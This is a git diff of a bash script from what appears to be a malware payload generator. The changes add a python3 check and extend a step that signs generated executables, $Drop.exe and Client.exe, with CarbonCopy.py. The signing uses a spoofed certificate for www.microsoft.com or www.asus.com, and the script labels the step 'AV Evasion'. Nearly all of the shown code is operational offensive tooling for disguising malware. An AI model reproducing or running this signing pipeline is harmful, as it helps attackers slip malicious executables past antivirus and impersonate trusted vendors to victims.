@@ -13013,9 +13013,14 @@ easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 if [ "$easter_egg" = "ON" ]; then
 
    ## Make sure CarbonCopy dependencies are installed
-   ossl_packer=`which osslsigncode`
+   pythonversion=$(python3 --version > /dev/null 2>&1)
    if [ "$?" -ne "0" ]; then
-      echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
+      echo "${RedF}[x] python3 Package not found, installing .."${Reset};sleep 2
+      echo "" && sudo apt-get update && apt-get install python3 && echo ""
+   fi
+   ossl_packer=$(which osslsigncode > /dev/null 2>&1)
+   if [ "$?" -ne "0" ]; then
+      echo "${RedF}[x] osslsigncode Package not found, installing .."${Reset};sleep 2
       echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
    fi
 
@@ -13023,11 +13028,13 @@ if [ "$easter_egg" = "ON" ]; then
    echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy) .."${Reset};sleep 2
    conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
    if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com";fi
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${BlueF} $SSL_domain"${Reset};sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${BlueF}$SSL_domain"${Reset};sleep 2
    cd $IPATH/obfuscate
-   xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2"
+   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
+   mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
    mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
    rm -r certs > /dev/nul 2>&1
+   chmod +x $IPATH/output/Client.exe > /dev/nul 2>&1
    chmod +x $IPATH/output/$Drop.exe > /dev/nul 2>&1
    cd $IPATH/
 
